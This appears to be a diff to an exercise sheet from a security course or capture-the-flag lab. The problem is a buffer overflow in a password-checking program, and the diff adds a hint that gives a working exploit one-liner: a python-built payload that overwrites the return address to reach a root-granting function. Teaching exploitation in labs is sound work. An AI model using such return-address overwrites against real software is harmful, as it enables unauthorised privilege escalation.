@@ -50,6 +50,8 @@ Problem4 (passwd3):
    statement: The program takes run time argument (like ./passwd3 passrd_string) and check the given password with the hard-coded one. There is also one loop-hole in the program. We use another function which does not check passwd but gives you root privilege. Can you jump to that function? If so, you can jump to any location of the stack and you can keep malicious code there and execute that.
   
    Tips: 1. Each function has a return statement and the program switch into the address located into the return address. Overwrite the return address with the address of the vulnerable function.
+   
+   HINTS: ./passwd3 `python -c 'print "A"*28+"\x7d\x84\x04\x08"'`
 
 
 Problem4 (passwd3):
